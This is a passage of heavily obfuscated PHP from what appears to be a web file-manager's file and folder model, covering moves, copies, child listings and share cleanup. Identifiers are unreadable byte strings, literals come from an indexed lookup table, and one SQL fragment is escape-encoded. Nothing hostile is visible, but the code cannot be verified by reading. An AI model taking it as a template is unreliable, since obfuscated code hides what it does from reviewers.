$ê»Ú œú = array(); $‘–Õ†† = array(); $this->_childrenListAll($§ô½ôÂï, $ê»Ú œú); $Àï¤Ãˆ¢ = count($ê»Ú œú); if ($Àï¤Ãˆ¢ == 0) { return $È´·°°ƒ; } $ì£åÓÜœ = $this->sourceInfo($È´·°°ƒ); foreach ($ê»Ú œú as $‹®õÇ¡é) { $Ñ¢›ğù‰ = $this->_makeItemData($‹®õÇ¡é, $ì£åÓÜœ, $‹®õÇ¡é[$á«Òòò[32]]); $Ñ¢›ğù‰[$á«Òòò[612]] = $‹®õÇ¡é[$á«Òòò[612]]; $‘–Õ††[] = $Ñ¢›ğù‰; } $this->chunkEventSet($á«Òòò[669], array($á«Òòò[670], $¤·É¥ûØ, $Àï¤Ãˆ¢)); $this->addAll($‘–Õ††, array(), !1); $š¬Ôõü­ = $this->where(array($á«Òòò[190] => $È´·°°ƒ))->select(); $î¤“äš = $this->_childrenMakeRelation($ê»Ú œú, $š¬Ôõü­); $î¤“äš[$§ô½ôÂï] = $È´·°°ƒ; $òåúğ‡ = array(); $¶¸‘ğŠ = array(); foreach ($š¬Ôõü­ as $‹®õÇ¡é) { $Ä×÷ÀĞ£ = $‹®õÇ¡é[$á«Òòò[191]]; $¹°ğ¥œ = $this->_childrenMatch($î¤“äš, $‹®õÇ¡é, $ì£åÓÜœ); $òåúğ‡[] = array($á«Òòò[191], $Ä×÷ÀĞ£, $á«Òòò[190], $¹°ğ¥œ[$á«Òòò[190]]); $¶¸‘ğŠ[] = array($á«Òòò[191], $Ä×÷ÀĞ£, $á«Òòò[612], $¹°ğ¥œ[$á«Òòò[612]]); $this->_copyApplyMeta($‹®õÇ¡é, $ÀÜıÇ¶); if ($‹®õÇ¡é[$á«Òòò[508]] != $á«Òòò[91]) { $ÀÜıÇ¶[$á«Òòò[660]][] = $‹®õÇ¡é[$á«Òòò[565]]; } } $this->chunkEventSet($á«Òòò[671], array($á«Òòò[672], $¤·É¥ûØ, $Àï¤Ãˆ¢)); $this->saveAll($òåúğ‡); $this->chunkEventSet($á«Òòò[673], array($á«Òòò[674], $¤·É¥ûØ, $Àï¤Ãˆ¢)); $this->saveAll($¶¸‘ğŠ); return $È´·°°ƒ; } private function _childrenMakeRelation($û“×¬, $»±í¤¡”) { $õÂ­˜ =& $_SERVER[”øäÃÍª]; $èïŞˆŞ = array(); $¨Ì÷ªœ = array(); foreach ($û“×¬ as $¿Ö©ÓŸ) { $ãÂã†½é = $¿Ö©ÓŸ[$õÂ­˜[32]] . $õÂ­˜[8] . $¿Ö©ÓŸ[$õÂ­˜[612]]; $èïŞˆŞ[$ãÂã†½é] = $¿Ö©ÓŸ[$õÂ­˜[191]]; } foreach ($»±í¤¡” as $¿Ö©ÓŸ) { $ãÂã†½é = $¿Ö©ÓŸ[$õÂ­˜[32]] . $õÂ­˜[8] . $¿Ö©ÓŸ[$õÂ­˜[612]]; $ÊÄĞÛ£¼ = $èïŞˆŞ[$ãÂã†½é]; $¨Ì÷ªœ[$ÊÄĞÛ£¼] = $¿Ö©ÓŸ[$õÂ­˜[191]]; } return $¨Ì÷ªœ; } private function _childrenMatch($Â‹À‘±ç, $ïÀ½ è, $ì—Å³÷«) { $¥à¬¬¡ =& $_SERVER[”øäÃÍª]; $ú‘“ÂüÔ = $ì—Å³÷«[$¥à¬¬¡[612]]; $—×âñ®  = $this->parentLevelArray($ïÀ½ è[$¥à¬¬¡[612]]); foreach ($—×âñ®  as $½úÔ°•Ô) { if (isset($Â‹À‘±ç[$½úÔ°•Ô])) { $ú‘“ÂüÔ .= $Â‹À‘±ç[$½úÔ°•Ô] . $¥à¬¬¡[675]; } } $ú‘“ÂüÔ = rtrim($ú‘“ÂüÔ, $¥à¬¬¡[50]) . $¥à¬¬¡[50]; $¶ûù¥‰à = $this->parentLevelArray($ú‘“ÂüÔ); $Ê©ùåÆ = $¶ûù¥‰à[count($¶ûù¥‰à) - 1]; return array($¥à¬¬¡[190] => $Ê©ùåÆ, $¥à¬¬¡[612] => $ú‘“ÂüÔ); } private function _makeItemData($¦ú§‰ı, $·˜¹±™İ, $Å¢Øºäé) { $ş“ù®øÌ =& $_SERVER[”øäÃÍª]; $¨ïë£ñÊ = array($ş“ù®øÌ[676] => $¦ú§‰ı[$ş“ù®øÌ[508]], $ş“ù®øÌ[517] => $Å¢Øºäé, $ş“ù®øÌ[677] => $¦ú§‰ı[$ş“ù®øÌ[509]] ? $¦ú§‰ı[$ş“ù®øÌ[509]] : $ş“ù®øÌ[12], $ş“ù®øÌ[566] => $¦ú§‰ı[$ş“ù®øÌ[565]] ? $¦ú§‰ı[$ş“ù®øÌ[565]] : 0, $ş“ù®øÌ[648] => $¦ú§‰ı[$ş“ù®øÌ[79]] ? $¦ú§‰ı[$ş“ù®øÌ[79]] : 0, $ş“ù®øÌ[678] => intval($·˜¹±™İ[$ş“ù®øÌ[188]]), $ş“ù®øÌ[679] => intval($·˜¹±™İ[$ş“ù®øÌ[597]]), $ş“ù®øÌ[680] => intval(USER_ID), $ş“ù®øÌ[681] => intval(USER_ID), $ş“ù®øÌ[500] => intval($·˜¹±™İ[$ş“ù®øÌ[191]]), $ş“ù®øÌ[682] => $·˜¹±™İ[$ş“ù®øÌ[612]] . $·˜¹±™İ[$ş“ù®øÌ[191]] . $ş“ù®øÌ[50], $ş“ù®øÌ[521] => $¦ú§‰ı[$ş“ù®øÌ[88]] ? $¦ú§‰ı[$ş“ù®øÌ[88]] : time(), $ş“ù®øÌ[527] => 0, $ş“ù®øÌ[683] => $ş“ù®øÌ[12]); return $¨ïë£ñÊ; } private function _copyApplyMeta($·¸Õ½†Ä, &$”óøÑÛÙ) { $€ûï¼ô =& $_SERVER[”øäÃÍª]; $”ºÉ­šñ = $·¸Õ½†Ä[$€ûï¼ô[191]]; $ˆ¥ÈäÆ˜ = $·¸Õ½†Ä[$€ûï¼ô[32]]; if (!isset($·¸Õ½†Ä[$€ûï¼ô[684]]) || !$·¸Õ½†Ä[$€ûï¼ô[684]] || $·¸Õ½†Ä[$€ûï¼ô[684]] == $€ûï¼ô[228]) { $”óøÑÛÙ[$€ûï¼ô[662]][] = array($€ûï¼ô[191], $”ºÉ­šñ, $€ûï¼ô[684], short_id($”ºÉ­šñ)); } if (Input::check($ˆ¥ÈäÆ˜, $€ûï¼ô[685])) { $”óøÑÛÙ[$€ûï¼ô[661]][] = array($€ûï¼ô[191] => $”ºÉ­šñ, $€ûï¼ô[95] => $€ûï¼ô[560], $€ûï¼ô[451] => str_replace($€ûï¼ô[53], $€ûï¼ô[12], Pinyin::get($ˆ¥ÈäÆ˜))); $”óøÑÛÙ[$€ûï¼ô[661]][] = array($€ûï¼ô[191] => $”ºÉ­šñ, $€ûï¼ô[95] => $€ûï¼ô[559], $€ûï¼ô[451] => Pinyin::get($ˆ¥ÈäÆ˜, $€ûï¼ô[686])); } $”óøÑÛÙ[$€ûï¼ô[661]][] = array($€ûï¼ô[191] => $”ºÉ­šñ, $€ûï¼ô[95] => $€ûï¼ô[539], $€ûï¼ô[451] => KodSort::makeStr($ˆ¥ÈäÆ˜)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($´“ŸÜîÚ) { $Ÿì‡ë¨ =& $_SERVER[”øäÃÍª]; $À»à•ğø = $this->sourceInfo($´“ŸÜîÚ); $°á²€½¦ = $Ÿì‡ë¨[687]; $‰òİµè = array($Ÿì‡ë¨[612] => array($Ÿì‡ë¨[643], $À»à•ğø[$Ÿì‡ë¨[612]] . $´“ŸÜîÚ . $Ÿì‡ë¨[644]), $Ÿì‡ë¨[528] => $this->targetIsDelete); $¾Ùèù½â = $this->field($°á²€½¦)->where($‰òİµè)->select(); if (!$¾Ùèù½â) { return; } $¾Ùèù½â = array_to_keyvalue($¾Ùèù½â, $Ÿì‡ë¨[191]); foreach ($¾Ùèù½â as $¡ıßôŠ) { $ôÔßë¿ = $¡ıßôŠ[$Ÿì‡ë¨[190]]; $´“ŸÜîÚ = $¡ıßôŠ[$Ÿì‡ë¨[191]]; if (!isset($this->_childrenListCache[$´“ŸÜîÚ]) && $¡ıßôŠ[$Ÿì‡ë¨[508]] == $Ÿì‡ë¨[91]) { $this->_childrenListCache[$´“ŸÜîÚ] = array(); } if (!isset($this->_childrenListCache[$ôÔßë¿])) { $this->_childrenListCache[$ôÔßë¿] = array(); } $this->_childrenListCache[$ôÔßë¿][$´“ŸÜîÚ] = $¡ıßôŠ; $this->_childrenItemCache[$´“ŸÜîÚ] = $¡ıßôŠ; } } private function _childrenListAll($“ö²èèâ, &$äşªæı«) { $„¢•›‚ =& $_SERVER[”øäÃÍª]; if (!isset($this->_childrenListCache[$“ö²èèâ])) { return; } $Ÿè¿°ºõ = $this->_childrenListCache[$“ö²èèâ]; foreach ($Ÿè¿°ºõ as $ã©Üæï => $¡ÛÌ´‹¹) { $äşªæı«[$ã©Üæï] = $¡ÛÌ´‹¹; if ($¡ÛÌ´‹¹[$„¢•›‚[508]] == $„¢•›‚[91]) { $this->_childrenListAll($ã©Üæï, $äşªæı«); } } } private function sourceInfoCache($ó¦šª¹ª) { if (isset($this->_childrenItemCache[$ó¦šª¹ª])) { return $this->_childrenItemCache[$ó¦šª¹ª]; } return $this->sourceInfo($ó¦šª¹ª); } private function _childrenList($–ÈóÂŞ¾) { if (isset($this->_childrenListCache[$–ÈóÂŞ¾])) { return $this->_childrenListCache[$–ÈóÂŞ¾]; } return $this->_childrenListSelect($–ÈóÂŞ¾); } private function _childrenListSelect($Ì”ë¢´) { $ĞıªÚ²— =& $_SERVER[”øäÃÍª]; $¢‚¶šì® = array($ĞıªÚ²—[190] => $Ì”ë¢´, $ĞıªÚ²—[528] => $this->targetIsDelete); $À€Şµ»Ÿ = $this->where($¢‚¶šì®)->select(); $À€Şµ»Ÿ = $À€Şµ»Ÿ ? $À€Şµ»Ÿ : array(); $åÔ¾¢ = array_to_keyvalue($À€Şµ»Ÿ, $ĞıªÚ²—[191]); $this->_childrenListCache[$Ì”ë¢´] = $åÔ¾¢; foreach ($åÔ¾¢ as $Ì”ë¢´ => $¦íÛ›İÀ) { $this->_childrenItemCache[$Ì”ë¢´] = $¦íÛ›İÀ; } return $åÔ¾¢; } private function fileNameExistAuto($é›¤œò–, $ä²­ŸËÎ) { $ñƒ–şï =& $_SERVER[”øäÃÍª]; if ($ä²­ŸËÎ[$ñƒ–şï[528]] == $ñƒ–şï[91]) { return $this->fileNameExist($é›¤œò–, $ä²­ŸËÎ[$ñƒ–şï[32]]); } return $this->fileNameExistCache($é›¤œò–, $ä²­ŸËÎ[$ñƒ–şï[32]]); } private function fileNameExistCache($ÄÁÜ·’¬, $ÊŒôêê‘) { $ËŞ»ÄÏâ =& $_SERVER[”øäÃÍª]; $ÊŒôêê‘ = strtolower($ÊŒôêê‘); $ğœ£«ÕË = $this->_childrenList($ÄÁÜ·’¬); foreach ($ğœ£«ÕË as $µçûŞ½š) { if ($ÊŒôêê‘ == strtolower($µçûŞ½š[$ËŞ»ÄÏâ[32]])) { return $µçûŞ½š[$ËŞ»ÄÏâ[191]]; } } return !1; } private function fileNameAutoCache($¬’à€É«, $“®ïóà«, $İ¼ïÀŞî, $²ã”ı¾) { $ƒÓİ”ëÑ =& $_SERVER[”øäÃÍª]; $ç—óİòí = $this->_childrenList($¬’à€É«); $•óğ¾ˆ® = array_to_keyvalue($ç—óİòí, $ƒÓİ”ëÑ[12], $ƒÓİ”ëÑ[32]); return $this->fileNameAutoGet($•óğ¾ˆ®, $“®ïóà«, $İ¼ïÀŞî, $²ã”ı¾); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ş†”ÎÉ…, $Ö¥„×¾È, $¡Œ÷ ®ü = REPEAT_REPLACE, $ˆØØ©–¯ = '') { $‡ÒÄÜÂ£ =& $_SERVER[”øäÃÍª]; $Ç·°»„ = $this->sourceInfo($ş†”ÎÉ…); $§¨èãİÎ = $this->sourceInfo($Ö¥„×¾È); if ($Ç·°»„[$‡ÒÄÜÂ£[190]] == $§¨èãİÎ[$‡ÒÄÜÂ£[191]]) { if ($Ç·°»„[$‡ÒÄÜÂ£[528]] == $‡ÒÄÜÂ£[91]) { Model($‡ÒÄÜÂ£[526])->restore(array($ş†”ÎÉ…)); } if (!$ˆØØ©–¯ || $ˆØØ©–¯ == $Ç·°»„[$‡ÒÄÜÂ£[32]]) { return $ş†”ÎÉ…; } } $¨‡£şœ’ = $this->pathInfoMore($ş†”ÎÉ…); if ($this->isParentOf($ş†”ÎÉ…, $Ö¥„×¾È)) { return !1; } if (!$Ç·°»„ || !$§¨èãİÎ || $§¨èãİÎ[$‡ÒÄÜÂ£[508]] != $‡ÒÄÜÂ£[91]) { return !1; } Hook::trigger($‡ÒÄÜÂ£[688], $¨‡£şœ’); $this->targetIsDelete = intval($Ç·°»„[$‡ÒÄÜÂ£[528]]); if ($Ç·°»„[$‡ÒÄÜÂ£[190]] == $Ö¥„×¾È && $ˆØØ©–¯ != $Ç·°»„[$‡ÒÄÜÂ£[32]]) { $÷Çíğ¸ = $this->fileNameExist($Ö¥„×¾È, $ˆØØ©–¯); if ($÷Çíğ¸ && $Ç·°»„[$‡ÒÄÜÂ£[508]] == $‡ÒÄÜÂ£[228]) { $¼›ú¾¢ƒ = $this->sourceInfo($÷Çíğ¸); $¢úÂûóü = $this->fileHistory($¼›ú¾¢ƒ, $Ç·°»„[$‡ÒÄÜÂ£[565]], $Ç·°»„[$‡ÒÄÜÂ£[79]]); if (!$¢úÂûóü) { Model($‡ÒÄÜÂ£[568])->remove($Ç·°»„[$‡ÒÄÜÂ£[565]]); } $this->removeNow($ş†”ÎÉ…, !1); $this->folderSizeReset($Ö¥„×¾È); Hook::trigger($‡ÒÄÜÂ£[689], $¨‡£şœ’); return $÷Çíğ¸; } } $—éË¢è¯ = $ˆØØ©–¯ ? $ˆØØ©–¯ : $Ç·°»„[$‡ÒÄÜÂ£[32]]; $this->lockMoveStart($ş†”ÎÉ…); $this->lockWriteStart($Ö¥„×¾È, $—éË¢è¯); $Ô´½Ì¾“ = array($‡ÒÄÜÂ£[660] => array(), $‡ÒÄÜÂ£[690] => !1); $this->clearShare($ş†”ÎÉ…, $Ö¥„×¾È); $Ñ„ÔÖ²ä = $this->fileNameExistAuto($Ö¥„×¾È, $Ç·°»„); $é‰ıãÕÈ = $this->_move($ş†”ÎÉ…, $Ö¥„×¾È, $¡Œ÷ ®ü, $Ô´½Ì¾“, $ˆØØ©–¯); $this->sourceCacheClear(); if ($Ç·°»„[$‡ÒÄÜÂ£[508]] == $‡ÒÄÜÂ£[91] && $Ñ„ÔÖ²ä) { $this->folderSizeResetChildren($é‰ıãÕÈ); } Model($‡ÒÄÜÂ£[230])->linkAdd($Ô´½Ì¾“[$‡ÒÄÜÂ£[660]]); if ($é‰ıãÕÈ && $Ñ„ÔÖ²ä && $Ô´½Ì¾“[$‡ÒÄÜÂ£[690]]) { $ÒÕûÀèÚ = $Ç·°»„[$‡ÒÄÜÂ£[508]] == $‡ÒÄÜÂ£[91] ? $this->_childrenListSelect($ş†”ÎÉ…) : !1; $åºÒÔ­ş = $ÒÕûÀèÚ && count($ÒÕûÀèÚ) > 0 ? !0 : !1; $this->removeNow($ş†”ÎÉ…, $åºÒÔ­ş); } $this->lockMoveEnd($ş†”ÎÉ…); $this->lockWriteEnd($Ö¥„×¾È, $—éË¢è¯); $this->folderSizeReset($Ç·°»„[$‡ÒÄÜÂ£[190]]); $this->folderSizeReset($Ö¥„×¾È); $Å¯˜‚¾‡ = array($Ç·°»„[$‡ÒÄÜÂ£[190]], $Ö¥„×¾È); if ($Ç·°»„[$‡ÒÄÜÂ£[508]] == $‡ÒÄÜÂ£[91]) { $Å¯˜‚¾‡[] = $ş†”ÎÉ…; } $this->updateModifyTime($Å¯˜‚¾‡); Model($‡ÒÄÜÂ£[663])->eventMove($ş†”ÎÉ…, $Ç·°»„[$‡ÒÄÜÂ£[190]], $Ö¥„×¾È); Hook::trigger($‡ÒÄÜÂ£[689], $¨‡£şœ’); return $é‰ıãÕÈ; } private function _move($ÀÄ¼›”‹, $½áŸè»ï, $›ŸĞãîó, &$Ëş«éòÍ, $ßÂ§¯—£ = '') { $±õÎÕô =& $_SERVER[”øäÃÍª]; $ä½Ç‰ĞÍ = $this->sourceInfo($ÀÄ¼›”‹); $ŠãšƒÈ¿ = $ä½Ç‰ĞÍ[$±õÎÕô[508]] == $±õÎÕô[91]; $Û°Êñ‚¬ = $ßÂ§¯—£ ? $ßÂ§¯—£ : $ä½Ç‰ĞÍ[$±õÎÕô[32]]; $…¡÷ø¤¨ = $this->fileNameExistAuto($½áŸè»ï, $ä½Ç‰ĞÍ); $this->lockMoveStart($ÀÄ¼›”‹); $this->lockWriteStart($½áŸè»ï, $Û°Êñ‚¬); if (!$…¡÷ø¤¨) { return $this->_moveForce($ÀÄ¼›”‹, $½áŸè»ï, $Û°Êñ‚¬); } $“¢¹Ğº¡ = $…¡÷ø¤¨; $şıÕ˜¤ = !1; if ($ŠãšƒÈ¿) { if ($›ŸĞãîó == REPEAT_RENAME_FOLDER) { $Û°Êñ‚¬ = $this->fileNameAuto($½áŸè»ï, $Û°Êñ‚¬, $›ŸĞãîó, $ŠãšƒÈ¿); $“¢¹Ğº¡ = $this->_moveForce($ÀÄ¼›”‹, $½áŸè»ï, $Û°Êñ‚¬); } else { $ö‚¿’»Ÿ = $this->_childrenListSelect($ÀÄ¼›”‹); foreach ($ö‚¿’»Ÿ as $±ÅúÙß°) { $şÈ™ò“ = REPEAT_REPLACE; $this->_move($±ÅúÙß°[$±õÎÕô[191]], $…¡÷ø¤¨, $şÈ™ò“, $Ëş«éòÍ); } $şıÕ˜¤ = !0; } } else { if ($›ŸĞãîó == REPEAT_RENAME || $›ŸĞãîó == REPEAT_RENAME_FOLDER) { $Û°Êñ‚¬ = $this->fileNameAuto($½áŸè»ï, $Û°Êñ‚¬, $›ŸĞãîó, $ŠãšƒÈ¿); $“¢¹Ğº¡ = $this->_moveForce($ÀÄ¼›”‹, $½áŸè»ï, $Û°Êñ‚¬); } else { $¾úÛ¸Ì = $this->sourceInfoCache($…¡÷ø¤¨); $±ıØ¾æÀ = $this->fileHistory($¾úÛ¸Ì, $ä½Ç‰ĞÍ[$±õÎÕô[565]], $ä½Ç‰ĞÍ[$±õÎÕô[79]]); if ($±ıØ¾æÀ) { $Ëş«éòÍ[$±õÎÕô[660]][] = $ä½Ç‰ĞÍ[$±õÎÕô[565]]; } $şıÕ˜¤ = !0; } } if ($şıÕ˜¤) { $Ëş«éòÍ[$±õÎÕô[690]] = !0; } return $“¢¹Ğº¡; } private function _moveForce($­ñ¤ø¬Ÿ, $˜çŸé¾÷, $ÑïÍ·¢Ò) { $ë‰õ›Ş =& $_SERVER[”øäÃÍª]; $±†ØàÛÛ = $this->sourceInfo($­ñ¤ø¬Ÿ); $æòÄÕ±Ì = $this->sourceInfo($˜çŸé¾÷); $šªÏÁÑø = $±†ØàÛÛ[$ë‰õ›Ş[508]] == $ë‰õ›Ş[91]; $¬’™ı–€ = array($ë‰õ›Ş[500] => $æòÄÕ±Ì[$ë‰õ›Ş[191]], $ë‰õ›Ş[682] => $æòÄÕ±Ì[$ë‰õ›Ş[612]] . $æòÄÕ±Ì[$ë‰õ›Ş[191]] . $ë‰õ›Ş[50], $ë‰õ›Ş[678] => $æòÄÕ±Ì[$ë‰õ›Ş[188]], $ë‰õ›Ş[679] => $æòÄÕ±Ì[$ë‰õ›Ş[597]], $ë‰õ›Ş[681] => USER_ID, $ë‰õ›Ş[517] => $ÑïÍ·¢Ò); $›ÊğÔı¿ = $±†ØàÛÛ[$ë‰õ›Ş[188]] == SourceModel::TYPE_GROUP && $æòÄÕ±Ì[$ë‰õ›Ş[188]] == SourceModel::TYPE_GROUP && $±†ØàÛÛ[$ë‰õ›Ş[597]] == $æòÄÕ±Ì[$ë‰õ›Ş[597]]; if (!$›ÊğÔı¿ && $this->moveClearAuth) { Model($ë‰õ›Ş[595])->authClear($­ñ¤ø¬Ÿ); } $±úïóŞç = $±†ØàÛÛ[$ë‰õ›Ş[528]] == $ë‰õ›Ş[91] && $æòÄÕ±Ì[$ë‰õ›Ş[528]] != $ë‰õ›Ş[91]; if ($±úïóŞç) { $¬’™ı–€[$ë‰õ›Ş[527]] = 0; } if ($šªÏÁÑø) { $×ÑØÂÎ = array($ë‰õ›Ş[682] => array($ë‰õ›Ş[643], $±†ØàÛÛ[$ë‰õ›Ş[612]] . $±†ØàÛÛ[$ë‰õ›Ş[191]] . $ë‰õ›Ş[644])); $­—¾‘± = $±†ØàÛÛ[$ë‰õ›Ş[612]] . $±†ØàÛÛ[$ë‰õ›Ş[191]] . $ë‰õ›Ş[50]; $©ØËà†› = $æòÄÕ±Ì[$ë‰õ›Ş[612]] . $æòÄÕ±Ì[$ë‰õ›Ş[191]] . $ë‰õ›Ş[50] . $±†ØàÛÛ[$ë‰õ›Ş[191]] . $ë‰õ›Ş[50]; $È«É¯ = array($ë‰õ›Ş[682] => array($ë‰õ›Ş[691], "\162\x65\x70\x6c\141\143\x65\x28\x70\141\162\x65\156\x74\114\x65\166\x65\154\x2c\47{$­—¾‘±}\x27\x2c\47{$©ØËà†›}\x27\51"), $ë‰õ›Ş[678] => $æòÄÕ±Ì[$ë‰õ›Ş[188]], $ë‰õ›Ş[679] => $æòÄÕ±Ì[$ë‰õ›Ş[597]]); if ($±úïóŞç) { $È«É¯[$ë‰õ›Ş[527]] = 0; } $this->where($×ÑØÂÎ)->data($È«É¯)->save(); } $this->where(array($ë‰õ›Ş[514] => $­ñ¤ø¬Ÿ))->data($¬’™ı–€)->save(); return $­ñ¤ø¬Ÿ; } private function clearShare($ÒØü åó, $Õ¥”ôê‘) { $ŸÃ®Ÿİ× =& $_SERVER[”øäÃÍª]; $µç¦µü = $this->sourceInfo($ÒØü åó); $ò…á³Ì¤ = $this->sourceInfo($Õ¥”ôê‘); if ($µç¦µü[$ŸÃ®Ÿİ×[597]] == $ò…á³Ì¤[$ŸÃ®Ÿİ×[597]] && $µç¦µü[$ŸÃ®Ÿİ×[188]] == $ŸÃ®Ÿİ×[692]) { return; } $¸©»Ä¸¾ = array($ŸÃ®Ÿİ×[612] => array($ŸÃ®Ÿİ×[643], $µç¦µü[$ŸÃ®Ÿİ×[612]] . $ÒØü åó . $ŸÃ®Ÿİ×[644])); $ÂêÁà×Ù = $this->field($ŸÃ®Ÿİ×[514])->where($¸©»Ä¸¾)->getField($ŸÃ®Ÿİ×[191], !0); if (!$ÂêÁà×Ù) { return; } $¸©»Ä¸¾ = array($ŸÃ®Ÿİ×[191] => array($ŸÃ®Ÿİ×[7], $ÂêÁà×Ù), $ŸÃ®Ÿİ×[693] => 1); $§²”Ê‚Ù = Model($ŸÃ®Ÿİ×[694])->field($ŸÃ®Ÿİ×[695])->where($¸©»Ä¸¾)->select(); if (!$§²”Ê‚Ù) { return; } $§²”Ê‚Ù = array_to_keyvalue($§²”Ê‚Ù, $ŸÃ®Ÿİ×[12], $ŸÃ®Ÿİ×[695]); $¸©»Ä¸¾ = array($ŸÃ®Ÿİ×[695] => array($ŸÃ®Ÿİ×[7], $§²”Ê‚Ù)); Model($ŸÃ®Ÿİ×[694])->where($¸©»Ä¸¾)->save(array($ŸÃ®Ÿİ×[693] => 0)); Model($ŸÃ®Ÿİ×[696])->where($¸©»Ä¸¾)->delete(); } public function copyFolderFromIO($û‚È…õ, $ÆâÙÚş›, $áªãÖ­”, $†òÒ²«ò, $§áîğô‘, $³ğÎğî” = false) { $İ”ºÛÛ‰ =& $_SERVER[”øäÃÍª]; $‰¥Ì—¸¤ = array($İ”ºÛÛ‰[661] => array(), $İ”ºÛÛ‰[662] => array(), $İ”ºÛÛ‰[660] => array(), $İ”ºÛÛ‰[697] => array()); $ÉàÇˆ§ƒ = $³ğÎğî” ? $³ğÎğî” : $û‚È…õ->pathThis($ÆâÙÚş›); $ÜıòáÛß = $this->fileNameExist($áªãÖ­”, $ÉàÇˆ§ƒ); $İúş‹¢Î = $this->mkdir($áªãÖ­”, $ÉàÇˆ§ƒ, $†òÒ²«ò); if (!$ÜıòáÛß || $†òÒ²«ò == REPEAT_RENAME_FOLDER) { $†òÒ²«ò = !1; } if ($ÜıòáÛß) { $this->_childrenAllMake($ÜıòáÛß); } Hook::trigger($İ”ºÛÛ‰[698]); $»‚Ş§Ò = KodIO::ioFileDriverGet($İ”ºÛÛ‰[506] . $áªãÖ­” . $İ”ºÛÛ‰[402]); $this->_copyChildTo($û‚È…õ, $ÆâÙÚş›, $İúş‹¢Î, $†òÒ²«ò, $‰¥Ì—¸¤, $§áîğô‘, $»‚Ş§Ò); Hook::trigger($İ”ºÛÛ‰[699]); if ($İúş‹¢Î) { $this->folderSizeResetChildren($İúş‹¢Î); } $this->_childrenListClear(); Model($İ”ºÛÛ‰[471])->addAll($‰¥Ì—¸¤[$İ”ºÛÛ‰[661]], array(), !0); Model($İ”ºÛÛ‰[663])->eventCopy($İúş‹¢Î); $this->saveAll($‰¥Ì—¸¤[$İ”ºÛÛ‰[662]]); Model($İ”ºÛÛ‰[568])->linkAdd($‰¥Ì—¸¤[$İ”ºÛÛ‰[660]]); Model($İ”ºÛÛ‰[568])->remove($‰¥Ì—¸¤[$İ”ºÛÛ‰[697]]); $this->folderSizeReset($áªãÖ­”); $this->updateModifyTime($áªãÖ­”); return $İúş‹¢Î; } private function _copyChildTo($ÊÁİŞ¤, $Ş†›Ÿ, $â²€½ëß, $Ö±…ôÙ­, &$“œù¥üÆ, $¬ÏÕŞ¬…, $ŠÖê³ß) { $³¢…Õ´¤ =& $_SERVER[”øäÃÍª]; $“ÙŸå—° = $this->sourceInfoCache($â²€½ëß); $‡Ö¿¶Š´ = $ÊÁİŞ¤->listPath($Ş†›Ÿ); $‡Ö¿¶Š´ = $‡Ö¿¶Š´ ? $‡Ö¿¶Š´ : array($³¢…Õ´¤[86] => array(), $³¢…Õ´¤[85] => array()); $éğ©ßÆ„ = array_merge($‡Ö¿¶Š´[$³¢…Õ´¤[86]], $‡Ö¿¶Š´[$³¢…Õ´¤[85]]); $œŒÁ’× = $this->_addFiles($ÊÁİŞ¤, $ŠÖê³ß, $‡Ö¿¶Š´[$³¢…Õ´¤[86]], $¬ÏÕŞ¬…); $¯½ÈÁ‹ß = array(); foreach ($éğ©ßÆ„ as &$úú™‘øš) { if (isset($œŒÁ’×[$úú™‘øš[$³¢…Õ´¤[32]]])) { $úú™‘øš = $œŒÁ’×[$úú™‘øš[$³¢…Õ´¤[32]]]; } $úú™‘øš[$³¢…Õ´¤[508]] = $úú™‘øš[$³¢…Õ´¤[33]] == $³¢…Õ´¤[78]; $úú™‘øš[$³¢…Õ´¤[509]] = substr(_get($úú™‘øš, $³¢…Õ´¤[166], $³¢…Õ´¤[12]), 0, 10); $úú™‘øš[$³¢…Õ´¤[79]] = _get($úú™‘øš, $³¢…Õ´¤[79], 0); $úú™‘øš[$³¢…Õ´¤[565]] = _get($úú™‘øš, $³¢…Õ´¤[565], 0); if (!isset($úú™‘øš[$³¢…Õ´¤[700]]) && $úú™‘øš[$³¢…Õ´¤[565]]) { $“œù¥üÆ[$³¢…Õ´¤[697]][] = $úú™‘øš[$³¢…Õ´¤[565]]; } if ($Ö±…ôÙ­) { $¥™º¿†¶ = $this->fileNameExistCache($â²€½ëß, $úú™‘øš[$³¢…Õ´¤[32]]); if ($¥™º¿†¶) { if ($úú™‘øš[$³¢…Õ´¤[508]] || $Ö±…ôÙ­ == REPEAT_SKIP) { continue; } if ($Ö±…ôÙ­ == REPEAT_REPLACE) { $š°Œæ˜ = $this->sourceInfoCache($¥™º¿†¶); $„ô™²ü = $this->fileHistory($š°Œæ˜, $úú™‘øš[$³¢…Õ´¤[565]], $úú™‘øš[$³¢…Õ´¤[79]]); if ($„ô™²ü) { $“œù¥üÆ[$³¢…Õ´¤[660]][] = $úú™‘øš[$³¢…Õ´¤[565]]; } continue; } else { if ($Ö±…ôÙ­ == REPEAT_RENAME) { $úú™‘øš[$³¢…Õ´¤[32]] = $this->fileNameAutoCache($â²€½ëß, $úú™‘øš[$³¢…Õ´¤[32]], $Ö±…ôÙ­, !1); } } } } if (!$úú™‘øš[$³¢…Õ´¤[508]] && $úú™‘øš[$³¢…Õ´¤[565]] == 0) { continue; } if (!$úú™‘øš[$³¢…Õ´¤[508]] && $úú™‘øš[$³¢…Õ´¤[565]]) { $“œù¥üÆ[$³¢…Õ´¤[660]][] = $úú™‘øš[$³¢…Õ´¤[565]]; } $¯½ÈÁ‹ß[] = $this->_makeItemData($úú™‘øš, $“ÙŸå—°, $úú™‘øš[$³¢…Õ´¤[32]]); } unset($úú™‘øš); if (!empty($¯½ÈÁ‹ß)) { $this->addAll($¯½ÈÁ‹ß); $this->_childrenListSelect($â²€½ëß); } $©Š¥áâ = $this->_childrenList($â²€½ëß); $©Š¥áâ = array_to_keyvalue($©Š¥áâ, $³¢…Õ´¤[32]); foreach ($éğ©ßÆ„ as $úú™‘øš) { $š°Œæ˜ = $©Š¥áâ[$úú™‘øš[$³¢…Õ´¤[32]]]; $‚ÏóõáÎ = $š°Œæ˜[$³¢…Õ´¤[191]]; $this->_copyApplyMeta($š°Œæ˜, $“œù¥üÆ); if ($úú™‘øš[$³¢…Õ´¤[33]] == $³¢…Õ´¤[78]) { $úú™‘øš[$³¢…Õ´¤[87]] = $ÊÁİŞ¤->getPathInner($úú™‘øš[$³¢…Õ´¤[87]]); $this->_copyChildTo($ÊÁİŞ¤, $úú™‘øš[$³¢…Õ´¤[87]], $‚ÏóõáÎ, $Ö±…ôÙ­, $“œù¥üÆ, 